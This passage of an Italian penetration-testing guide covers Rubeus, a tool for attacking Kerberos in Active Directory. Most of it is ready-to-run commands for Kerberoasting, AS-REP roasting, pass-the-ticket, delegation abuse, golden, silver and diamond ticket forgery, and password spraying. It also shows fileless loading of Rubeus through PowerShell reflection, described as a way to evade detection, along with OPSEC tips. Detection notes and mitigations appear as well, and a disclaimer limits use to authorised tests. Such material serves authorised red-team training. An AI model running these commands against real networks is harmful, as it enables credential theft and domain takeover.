Rubeus.exe asktgt /user:svc_sql /password:PASSWORD123 /domain:corp.local /ptt
```

Ora il TGT di svc\_sql è in memoria. Sei svc\_sql. Se svc\_sql ha diritti particolari (admin su fileserver, esecutore di job SQL), usi quei diritti direttamente.

**Step 4b: Account senza password (delegation abuse)**

Se l'account non ha password crackabile, ma BloodHound mostra che ha delegation configurata:

```cmd
Rubeus.exe s4u /user:svc_constrained /rc4:HASH_DEL_KERBEROASTING /impersonateuser:administrator /msdsspn:cifs/server.corp.local /ptt
```

Qui S4U2Self + S4U2Proxy impersonano administrator verso il target — senza bisogno di crack.

**Step 5: Lateral movement → DA**

Con i diritti di un account compromesso, raggiungi il Domain Admin:

* Se sei admin su un server, accedi a C$ e installa persistence
* Se hai diritti su ADCS, sfrutta ESC1/ESC8 per ottenere certificato admin
* Se hai diritti di modificare utenti, abusa della shadow credentials o della delegazione

Torna a BloodHound per vedere il prossimo salto.

**Errore comune:** Lancia Rubeus su 5000 account, cracka 50 password, poi non sa come usarle perché non ha mappa dei privilegi. BloodHound prima, Rubeus dopo.

## Esecuzione in-memory: Rubeus come libreria .NET

Rubeus non deve obbligatoriamente essere un binario su disco — può essere caricato direttamente in memoria tramite reflection:

**Da PowerShell** (file-less esecuzione):

```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Path\To\Rubeus.exe")
[System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main("kerberoast /outfile:hashes.txt".Split())
```

Oppure, se Rubeus è codificato in base64 (per bypassare i detection di download):

```powershell
$b64 = "BASE64_RUBEUS_QUI"
$bytes = [System.Convert]::FromBase64String($b64)
[System.Reflection.Assembly]::Load($bytes)
[Rubeus.Program]::Main("asktgt /user:X /password:Y /ptt".Split())
```

**Da Cobalt Strike** (execute-assembly):

```
execute-assembly /path/to/Rubeus.exe kerberoast /outfile:hashes.txt
```

Cobalt Strike carica il binario in-process e lo esegue senza toccarlo su disco.

**Da un C# project esterno** (uso Rubeus come DLL):

1. Compila Rubeus: `msbuild Rubeus.sln /p:Configuration=Release`
2. Nel tuo progetto, aggiungi riferimento a `Rubeus.dll`
3. Usa i namespace:

```csharp
using Rubeus;
using Rubeus.Commands;
using Rubeus.Lib;

// Esegui Kerberoasting
var args = new string[] { "kerberoast", "/outfile:hashes.txt" };
Program.Main(args);
```

**Vantaggi dell'esecuzione in-memory:**

* Nessun file su disco (salta file-based detection)
* AMSI può still bloccare se il CLR ha AMSI abilitato (.NET 4.8+)
* Script block logging in PowerShell catturaà comunque il comando

**Rilevamento:**

* **ETW (Event Tracing for Windows)**: CLR loaded in non-.NET process (Cobalt Strike) è osservabile
* **Sysmon Event ID 7**: DLL caricata (System.DirectoryServices.dll, etc.) da processo sospetto
* **AMSI**: se abilitato sul sistema, intercetta reflection-based execution

## Troubleshooting

| Errore                           | Causa                                                     | Fix                                                                                 |
| -------------------------------- | --------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| `KRB_AP_ERR_SKEW`                | Clock desincronizzato con il DC                           | `w32tm /resync /force`                                                              |
| `KDC_ERR_PREAUTH_REQUIRED`       | Account non vulnerabile ad AS-REP roasting                | Normale, non è un bug: cerca altri account                                          |
| Kerberoast restituisce zero hash | Nessun SPN configurato o ACL restrittive                  | Verifica con `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`                |
| S4U fallisce                     | Delegation non configurata o SPN target errato            | Controlla `msDS-AllowedToDelegateTo` e l'esistenza dell'SPN                         |
| Ticket rifiutato dopo `/nopac`   | Alcuni servizi richiedono il PAC per validare i privilegi | Rimuovi `/nopac`, usa la richiesta standard                                         |
| Rubeus rilevato subito           | Binario compilato di default (signature nota)             | Ricompila con modifiche minime al codice, evita build precompilate scaricate online |

## Limiti di Rubeus: cosa NON fa

Molti pentester pensano che Rubeus faccia tutto. Non è vero. Rubeus è specializzato in **Kerberos ticket**, non in credential extraction generico:

* ❌ **DCSync** — non replica il database del DC. Serve Mimikatz `lsadump::dcsync` o Impacket `secretsdump.py`.
* ❌ **Dump LSASS** — non legge memoria LSASS per password in chiaro. Serve Mimikatz `sekurlsa::logonpasswords`.
* ❌ **Dump SAM** — non dumpa hash locali. Serve `reg save` + offline parsing.
* ❌ **Dump DPAPI** — non decodifica credenziali DPAPI. Serve Mimikatz `dpapi::` oppure SharpDPAPI.
* ❌ **Lateral movement** → Rubeus ottiene il ticket, non lo esegue. Serve `psexec`, `wmiexec` o Impacket.
* ❌ **Pass-the-Hash NTLM puro** — Rubeus fa Overpass-the-Hash (hash → Kerberos). Pass-the-Hash NTLM classico richiede `PsExec /user:hash`.

**Ragionamento:** Rubeus è verticale — specializzato in Kerberos protocol. Per il resto: Mimikatz per LSASS, Impacket per remote, SharpUp per enumeration.

## RC4 vs AES: encryption types in Kerberos

Kerberos supporta diversi tipi di cifratura per il ticket. I due principali:

| Tipo   | Nome                      | Velocità crack         | Rilevamento            | Moderno   |
| ------ | ------------------------- | ---------------------- | ---------------------- | --------- |
| RC4    | `0x17` ARCFOUR\_HMAC\_MD5 | ⚡ Veloce (ore)         | ✅ Downgrade rilevabile | ❌ Vecchio |
| AES256 | `0x12` AES256\_CTS\_HMAC  | 🐢 Lentissimo (giorni) | ✅ No downgrade         | ✅ Moderno |

**Scelta strategica:**

Se kerberoasti un account e vedi che supporta AES256, **non** usare `/rc4`. Rubeus userà AES256 e il crack sarà esponenzialmente più lento. Se supporta SOLO RC4, bene — crack è veloce.

Flag OPSEC: con `/rc4opsec`, Rubeus kerberoasta solo account RC4, evitando il downgrade che sarebbe rilevabile dai DC:

```cmd
Rubeus.exe kerberoast /rc4opsec /delay:5000
```

**Ragionamento:** Ogni `asktgt /password:X` si negozia con il KDC sul miglior etype disponibile. Downgrade forzato a RC4 quando l'account supporta AES è un segnale di anomalia.

## Hash types per Hashcat

Tabella di riferimento rapido per capire quale hash è uscito da quale attacco:

| Attacco             | Hashcat mode | Prefisso hash    |
| ------------------- | ------------ | ---------------- |
| Kerberoast RC4      | 13100        | `$krb5tgs$23$`   |
| Kerberoast AES128   | 19600        | `$krb5tgs$17$`   |
| Kerberoast AES256   | 19700        | `$krb5tgs$18$`   |
| AS-REP Roasting RC4 | 18200        | `$krb5asrep$23$` |

## Cleanup

A fine engagement, rimuovi le tracce lasciate sul target:

```cmd
Rubeus.exe purge
del C:\Windows\Temp\rubeus.exe
```

`purge` elimina i ticket importati nella sessione corrente (o in una specifica con `/luid`). Se hai usato `/createnetonly`, chiudi anche il processo sacrificale creato. Se hai forgiato golden/silver ticket, ricorda che restano validi finché non scade la password krbtgt/dell'account di servizio usato — non c'è un modo per "revocarli" lato attaccante, va gestito nel report per il cliente.

## Errori comuni

* **Kerberoastare tutto il dominio senza criterio**: su domini grandi genera un burst di richieste TGS facilmente rilevabile. Meglio targettizzare con `/user` o incrociare prima con BloodHound.
* **Insistere con RC4 quando il dominio supporta AES**: chiedere esplicitamente RC4 su un account che supporta AES è un downgrade di cifratura, uno dei segnali più controllati lato DC — usa `/aes` quando possibile.
* **Crack infinito su hash AES256**: se dopo qualche ora di dizionario/regole non esce nulla, il tempo va speso altrove, non a estendere la wordlist all'infinito.
* **Ignorare i gMSA**: kerberoastare un account gMSA è tempo sprecato, la password è casuale e ruotata — verificalo prima con `Get-ADServiceAccount` o via BloodHound.
* **Sovrascrivere il TGT della sessione corrente**: usare `/ptt` senza `/createnetonly` su un contesto già autenticato cancella il TGT esistente, a volte perdendo l'accesso che avevi.

## Quando scegliere Rubeus

| Scenario                               | Rubeus                           |
| -------------------------------------- | -------------------------------- |
| Kerberoasting / AS-REP Roasting        | ✅                                |
| Pass-the-Ticket / Overpass-the-Hash    | ✅                                |
| PKINIT con certificato rubato          | ✅                                |
| Abuso delegation (S4U, RBCD)           | ✅                                |
| Forgery ticket (golden/silver/diamond) | ✅                                |
| Estrazione password in chiaro da LSASS | ❌ (serve Mimikatz)               |
| Dump credenziali generico              | ❌ (fuori scope, non tocca LSASS) |

## FAQ

### Cos'è Rubeus?

Rubeus è un tool C# open source di GhostPack per interagire col protocollo Kerberos in Active Directory: richiede, manipola e importa ticket TGT/TGS senza toccare la memoria di LSASS. Copre Kerberoasting, AS-REP Roasting, Pass-the-Ticket e l'abuso della delegation, ed è lo standard de facto per il credential access via Kerberos nei red team engagement.

### Rubeus vs Mimikatz: quale usare?

Rubeus non richiede privilegi amministrativi per la maggior parte delle azioni perché non tocca LSASS, quindi è più silenzioso e meno soggetto a detection EDR basata sull'accesso alla memoria di processo. Mimikatz resta superiore per l'estrazione diretta di credenziali dalla memoria (password in chiaro, hash NTLM) quando hai già privilegi elevati.

### Serve essere amministratore per usare Rubeus?

No, per Kerberoasting e AS-REP Roasting basta un account di dominio qualsiasi, perché sono richieste Kerberos legittime verso il KDC. Servono privilegi elevati solo per `dump`, che estrae ticket dalla cache LSASS di altri utenti sulla stessa macchina.

### Quando NON usare Rubeus?

Non usarlo per l'estrazione diretta di password in chiaro dalla memoria: quello è il compito di Mimikatz, non di Rubeus, che lavora solo a livello di protocollo Kerberos. Non usarlo nemmeno come primo passo senza aver prima enumerato il dominio con BloodHound — kerberoastare a caso su centinaia di account produce rumore inutile e spesso zero risultati utili.

## Tabella MITRE ATT\&CK completa

Tutte le tecniche Kerberos che Rubeus implementa e il loro mapping MITRE:

| Attacco                      | Tecnica MITRE | Comando Rubeus              |
| ---------------------------- | ------------- | --------------------------- |
| Kerberoasting                | T1558.003     | `kerberoast`                |
| AS-REP Roasting              | T1558.004     | `asreproast`                |
| Pass-the-Ticket              | T1550.003     | `ptt`                       |
| Overpass-the-Hash            | T1550.003     | `asktgt /rc4:HASH`          |
| S4U2Self + S4U2Proxy         | T1558.004     | `s4u`                       |
| Constrained Delegation       | T1528         | `s4u`                       |
| RBCD                         | T1528         | `s4u`                       |
| Unconstrained Delegation     | T1548.004     | `monitor`                   |
| Golden Ticket                | T1558.001     | `golden`                    |
| Silver Ticket                | T1558.002     | `silver`                    |
| Diamond Ticket               | T1558.004     | `diamond`                   |
| Forged Ticket                | T1558         | `golden`/`silver`/`diamond` |
| Credential Access (roasting) | T1110.003     | `kerberoast`/`asreproast`   |

## Origine e storia: SpecterOps & GhostPack

Rubeus non nasce dal nulla. Per capire l'autorevolezza dello strumento:

* **SpecterOps** è un top tier red team / security research firm (ex-Harmj0y e altre leggende di offensive security)
* **GhostPack** è la loro suite di tool C#: Rubeus, Seatbelt, SharpDPAPI, SharpUp, SharpWMI
* **Kekeo** è il padre di Rubeus — tool più vecchio di Will Schroeder che faceva Kerberos su Windows
* Rubeus evolve Kekeo, aggiunge moderno C#, refactoring, più comandi

Rubeus oggi è lo standard di facto nei Red Team engagement per tutto ciò che riguarda ticket Kerberos. È citato in OSEP, su HackThebox, nei report professionali di Mandiant/CrowdStrike.

## Confronto rapido con alternative

| Tool                                                               | Linguaggio | LSASS richiesto        | Delegation abuse                    | Esecuzione                     |
| ------------------------------------------------------------------ | ---------- | ---------------------- | ----------------------------------- | ------------------------------ |
| Rubeus                                                             | C#         | No (tranne `dump`)     | Completo (S4U, RBCD, unconstrained) | Binario/execute-assembly       |
| Kekeo                                                              | C          | Sì (vecchio approccio) | Parziale                            | Binario (discontinuato)        |
| Mimikatz                                                           | C          | Sì                     | Parziale                            | Binario                        |
| [Impacket](https://hackita.it/articoli/impacket/) (GetUserSPNs.py) | Python     | No                     | Limitato                            | Remoto, da Linux               |
| Invoke-Kerberoast                                                  | PowerShell | No                     | No                                  | Script, più rilevabile da AMSI |

### Rubeus può forgiare golden e silver ticket come Mimikatz?

Sì. Rubeus non è solo per richiedere ticket legittimi: i comandi `golden`, `silver` e `diamond` forgiano ticket da zero (o li modificano) usando l'hash krbtgt o dell'account di servizio. Il diamond ticket, in particolare, è più difficile da rilevare perché parte da un TGT reale ottenuto con una richiesta legittima al KDC.

## Tabella decisionale: quale comando usare

Quando sei nel vivo di un assessment, rapido: cosa hai e cosa fai?

| Ho...                               | Uso comando                                                               | Risultato                                  |
| ----------------------------------- | ------------------------------------------------------------------------- | ------------------------------------------ |
| Password di un utente               | `asktgt /password:X /ptt`                                                 | TGT in memoria, sessione compromessa       |
| Hash NTLM (da crack o leak)         | `asktgt /rc4:HASH /ptt`                                                   | Overpass-the-Hash                          |
| Hash AES256 (da kerberoast o DPAPI) | `asktgt /aes256:HASH /ptt`                                                | TGT valido                                 |
| Certificato rubato (.pfx)           | `asktgt /certificate:file.pfx /password:certpass /ptt`                    | PKINIT, TGT da certificato                 |
| TGT già in memoria                  | `tgssub /ticket:BASE64 /altservice:cifs`                                  | Modifica SPN per accedere servizio diverso |
| SPN di servizio account             | `kerberoast /user:svc_X`                                                  | Hash per crack offline                     |
| Account senza preauth               | `asreproast /format:hashcat`                                              | Hash AS-REP per crack                      |
| Account con delegation              | `s4u /user:svc_del /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target` | Impersonazione via S4U2Proxy               |
| Accesso come SYSTEM su un server    | `tgtdeleg`                                                                | TGT senza bisogno di password              |
| Hash krbtgt (compromesso DC)        | `golden /aes256:KRBTGT_HASH /user:admin /ldap /ptt`                       | Golden ticket, accesso illimitato          |
| Hash di un servizio                 | `silver /service:cifs /rc4:HASH /user:admin /ptt`                         | Silver ticket verso quel servizio          |

## Mitigazioni moderne: FAST, Armoring, Authentication Policies

Negli ultimi anni Microsoft ha aggiunto difese significative. Rubeus funziona lo stesso, ma devi sapere che ci sono contro te:

**Kerberos Armoring (FAST — Flexible Authentication Secure Tunneling)**

Se il dominio ha FAST abilitato (Group Policy su DC + client), ogni AS-REQ è criptato dentro una "armored tunnel" usando il TGT della macchina:

```
Client AS-REQ → [armored con TGT della macchina] → KDC
```

L'AS-REP torna criptato e sigillato. Implicazione: se non sei sulla macchina giusta (con il TGT della macchina), la richiesta fallisce con `0x19 - Additional pre-authentication required`.

**Rubeus e FAST:** Funziona comunque, ma se sei esterno alla rete (da Linux con Impacket, o da WireGuard), FAST ti blocca. La macchina target deve avere il TGT della macchina — non basta il TGT utente.

**Authentication Policies e Authentication Silos (Tier 0 protection)**

Alcune aziende configurano "silos" di autenticazione: solo utenti Tier 0 possono autenticarsi da macchine Tier 0. Se provi a fare `asktgt` come admin da una macchina non autorizzata, il KDC rifiuta:

```
KDC: "Tu sei admin ma la tua macchina non è Tier 0 → No TGT"
```

Rubeus non può bypassare questo — è una regola del KDC.

**Credential Guard**

Se il target ha Credential Guard abilitato, i ticket in memoria sono criptati. Non puoi dumpare i TGT con `dump` — Rubeus non riesce a leggerli. Puoi ancora fare `asktgt` (negozia un nuovo ticket), ma non estrai ticket già in cache.

**gMSA e password casuali**

Sempre più account di servizio usano gMSA (Group Managed Service Account) — la password è casuale e ruotata ogni 30 giorni. Kerberoastare un gMSA è inutile, il crack non funziona mai.

**Conclusione:** Rubeus rimane lo standard Red Team, ma in ambienti moderni (Windows Server 2016+, Defender for Identity, FAST abilitato) la finestra di opportunità è più stretta. La strategia cambia: enumera di più, attacca di meno (e più preciso).

## Cheat Sheet Finale

| Task                            | Comando                                                                             |
| ------------------------------- | ----------------------------------------------------------------------------------- |
| Kerberoast                      | `Rubeus.exe kerberoast /outfile:h.txt`                                              |
| Kerberoast OPSEC                | `Rubeus.exe kerberoast /delay:3000 /jitter:30`                                      |
| AS-REP roast                    | `Rubeus.exe asreproast /format:hashcat`                                             |
| Scan pre-auth (silenzioso)      | `Rubeus.exe preauthscan`                                                            |
| TGT da password                 | `Rubeus.exe asktgt /user:X /password:Y /ptt`                                        |
| TGT da hash                     | `Rubeus.exe asktgt /user:X /rc4:HASH /ptt`                                          |
| TGT da certificato (PKINIT)     | `Rubeus.exe asktgt /user:X /certificate:file.pfx /ptt`                              |
| Pass-the-Ticket                 | `Rubeus.exe ptt /ticket:BASE64`                                                     |
| S4U delegation abuse            | `Rubeus.exe s4u /user:X /rc4:Y /impersonateuser:admin /msdsspn:SPN /ptt`            |
| Monitor nuovi TGT               | `Rubeus.exe monitor /interval:5`                                                    |
| Lista ticket correnti           | `Rubeus.exe klist`                                                                  |
| Rimuovi ticket                  | `Rubeus.exe purge`                                                                  |
| Golden ticket                   | `Rubeus.exe golden /aes256:KRBTGT_HASH /user:X /ldap /ptt`                          |
| Silver ticket                   | `Rubeus.exe silver /service:SPN /rc4:HASH /user:X /ldap /ptt`                       |
| Diamond ticket                  | `Rubeus.exe diamond /krbkey:KEY /user:X /password:Y /ticketuser:Z`                  |
| TGT senza elevazione            | `Rubeus.exe tgtdeleg`                                                               |
| Decodifica ticket + estrai hash | `Rubeus.exe describe /ticket:BASE64`                                                |
| Password spray via Kerberos     | `Rubeus.exe brute /password:X /noticket`                                            |
| Sostituisci service name (RBCD) | `Rubeus.exe tgssub /ticket:X /altservice:cifs`                                      |
| Hash da password nota           | `Rubeus.exe hash /password:X /user:Y /domain:Z`                                     |
| Converti kirbi→ccache           | `python3 ticketConverter.py t.kirbi t.ccache`                                       |
| Cambio password (Kerberos)      | `Rubeus.exe changepw /user:X /password:VECCHIA /new:NUOVA`                          |
| Richiedi credenziali via U2U    | `Rubeus.exe asktgt /user:X /rc4:HASH /getcredentials`                               |
| Info sessione logon corrente    | `Rubeus.exe logonsession`                                                           |
| Keylist attack (finge RODC)     | `Rubeus.exe asktgs /enctype:aes256 /keylist /ticket:T.kirbi /service:krbtgt/domain` |
| Richiesta via KDC proxy         | `Rubeus.exe asktgt /user:X /password:Y /proxyurl:http://proxy:8080`                 |
| Specifica encryption type       | `Rubeus.exe asktgt /user:X /password:Y /enctype:AES256`                             |
| Kerberoast solo AES (RC4 OPSEC) | `Rubeus.exe kerberoast /rc4opsec /delay:5000 /jitter:30`                            |
| Output su file                  | `Rubeus.exe kerberoast /consoleoutfile:output.txt`                                  |
| Rinova ticket scaduto           | `Rubeus.exe renew /ticket:BASE64`                                                   |

## Guide correlate su hackita.it

* [Kerberos: protocollo e attacchi](https://hackita.it/articoli/kerberos/)
* [Kerberoasting](https://hackita.it/articoli/kerberoasting/)
* [Mimikatz](https://hackita.it/articoli/mimikatz/)
* [Golden Ticket](https://hackita.it/articoli/golden-ticket/)
* [Silver Ticket](https://hackita.it/articoli/silver-ticket/)
* [RBCD: Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)

## Riferimenti

* [GhostPack/Rubeus — repository ufficiale](https://github.com/GhostPack/Rubeus)
* [Rubeus Command Reference (DeepWiki)](https://deepwiki.com/r3motecontrol/Ghostpack-CompiledBinaries/2.1-rubeus-command-reference)

***

*Contenuto a scopo educativo per penetration test e red team operation autorizzati per iscritto. L'uso di Rubeus contro sistemi senza consenso esplicito del proprietario è illegale.*

\#tools #rubeus #active-directory #kerberos
